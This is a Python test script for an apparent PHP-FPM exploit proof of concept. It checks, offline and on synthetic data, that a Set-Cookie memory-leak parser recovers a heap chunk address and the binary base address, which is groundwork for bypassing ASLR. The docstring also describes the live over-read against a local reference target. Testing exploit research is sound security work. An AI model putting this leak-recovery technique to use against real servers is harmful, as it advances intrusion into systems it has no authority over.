#!/usr/bin/env python3
"""Verify fpm_cookie_window_leak.py -- the sink-free fpm Set-Cookie VAL-REDIRECT
leak's K+binbase recovery.

Claims under test (offline, no lab):
  1. parse_window() recovers the 2 MiB ZendMM chunk K from a synthetic
     VAL-REDIRECT window whose shot carries the 0x40-stride self-references
     (via carrier_base_locate.self_locate).
  2. it recovers binbase from a disclosed &zval_ptr_dtor word
     (binbase = word - off["zval_ptr_dtor"]).
  3. chunk-only ignition: a single narrow window with one chunk-interior
     pointer yields K with binbase=None (no image word reachable).

Run:
    python3 -I verify_fpm_cookie_window_leak.py

Live over-read (the open end-to-end step, NOT exercised here): the survivable
fpm arm + VAL-REDIRECT var_push write + send_cookie, driven against the reference target
(reference nginx front 127.0.0.1:8080, Host ref.local, offsets BUILTIN_OFFSETS["8.3.26-fpm"]).
"""
import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import fpm_cookie_window_leak as m  # noqa: E402


def main():
    off = {"zval_ptr_dtor": 0x57a790}
    chunk = 0x7f2a1ec00000
    binbase = 0x7f2a00000000
    fails = 0

    got = m.parse_window(m._synth_windows(chunk, binbase, off["zval_ptr_dtor"]), off)
    c_ok = got["chunk"] == chunk
    b_ok = got["binbase"] == binbase
    print(f"[1] chunk   {got['chunk']:#x} == {chunk:#x}  {'PASS' if c_ok else 'FAIL'}")
    print(f"[2] binbase {got['binbase'] and hex(got['binbase'])} == {binbase:#x}  "
          f"{'PASS' if b_ok else 'FAIL'}")
    fails += (not c_ok) + (not b_ok)

    narrow = struct.pack("<Q", chunk + 0x5c000) + b"/02BBBB"
    c2 = m.parse_window(narrow, off)
    n_ok = c2["chunk"] == chunk and c2["binbase"] is None
    print(f"[3] chunk-only {c2['chunk']:#x}, binbase={c2['binbase']}  "
          f"{'PASS' if n_ok else 'FAIL'}")
    fails += (not n_ok)

    print("PASS" if fails == 0 else f"FAIL ({fails})")
    return 1 if fails else 0


if __name__ == "__main__":
    raise SystemExit(main())
